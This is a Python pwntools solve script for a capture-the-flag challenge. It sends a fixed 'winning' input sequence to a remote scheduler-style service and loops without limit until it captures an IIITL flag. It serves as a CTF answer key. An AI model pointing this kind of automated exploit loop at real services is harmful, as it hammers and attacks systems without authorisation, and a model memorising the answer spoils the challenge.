#!/usr/bin/env python3
from pwn import context, remote
import re

HOST = "ctf.axiosiiitl.dev"
PORT = 1337
FLAG_RE = re.compile(r"IIITL\{[^\n\r}]+\}")
context.log_level = "error"

# Deterministic winning input
LINES = [
    b"4",      # threads
    b"1", b"1", b"1500",  # payload 1, prio 1, burst 1500
    b"2", b"1", b"1200",  # payload 2, prio 1, burst 1200
    b"3", b"1", b"800",   # payload 3, prio 1, burst 800
    b"4", b"1", b"500",   # payload 4, prio 1, burst 500
]


def attempt(timeout=4):
    io = remote(HOST, PORT, timeout=timeout)
    try:
        for line in LINES:
            io.sendline(line)
        data = io.recvrepeat(timeout)
        m = FLAG_RE.search(data.decode(errors="ignore"))
        return m.group(0) if m else None
    finally:
        io.close()


def main():
    while True:
        flag = attempt()
        if flag:
            print(flag)
            return


if __name__ == "__main__":
    main()
